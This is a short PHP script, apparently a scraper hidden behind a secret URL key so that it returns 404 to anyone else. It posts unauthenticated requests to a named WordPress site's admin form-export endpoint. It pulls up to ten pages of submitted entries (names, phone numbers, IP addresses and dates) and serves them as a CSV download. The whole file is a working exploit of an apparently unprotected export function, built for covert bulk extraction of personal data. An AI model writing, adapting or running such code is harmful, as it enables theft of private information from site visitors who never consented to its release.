<?php 

if (!isset($_GET['quack']) || $_GET['quack'] !== "INVOKOdyWUGw2bc") {
        http_response_code(404);
        die();
}

function download($pageNum = 1)
{
	$siteUrl = "http://haiden.tech/";
	$curlURL = "{$siteUrl}wp-admin/admin.php?page=vfb-export";
	$postFields = array(
			"forms_form_id="=>"0",
			"vfb-content"=>"entries",
			"format"=>"csv",
			"entries_form_id"=>"2",
			"entries_start_date"=>"0",
			"entries_end_date"=>"0",
			"entries_date_period"=>"0",
			"entries_page"=>$pageNum,
			"entries_columns"=>array(
				"Date Submitted",
				"IP Address",
				"Firstname{{22}}",
				"Lastname{{23}}",
				"Phone{{24}}",
			)
	);
	$postFields = http_build_query($postFields);
	$curlres = curl_init($curlURL);
	curl_setopt($curlres, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curlres, CURLOPT_POST, true);
	curl_setopt($curlres, CURLOPT_POSTFIELDS, $postFields);
	return curl_exec($curlres);
}
$fileOutput = tempnam(sys_get_temp_dir(), "asdas");
$fileRes = fopen($fileOutput, "w+");
foreach (range(1, 10) as $key => $value) {
	$result = download($value);
	//write the contents temporarirly to a temp file 
	$tempFile = tempnam(sys_get_temp_dir(), "ansdjajksndkjn");
	file_put_contents($tempFile, $result);
	//open the temp file 
	$tempFileRes = fopen($tempFile, "r+");
	while (!feof($tempFileRes)) {
		$currentCsvLineArr = fgetcsv($tempFileRes);//get the current csv line from temp file
		if (trim($currentCsvLineArr[0]) !== "Date Submitted" || $value === 1) {
			@fputcsv($fileRes, $currentCsvLineArr);
		}
	}
	fclose($tempFileRes);
}
fclose($fileRes);
$fileName = 'all-data-export-'.date("Y-m-d H:i:s");
header("Pragma: public");
header("Expires: 0");
header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
header("Cache-Control: private",false);
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename=\"$fileName.csv\";" );
header("Content-Transfer-Encoding: binary");
echo file_get_contents($fileOutput);
?>
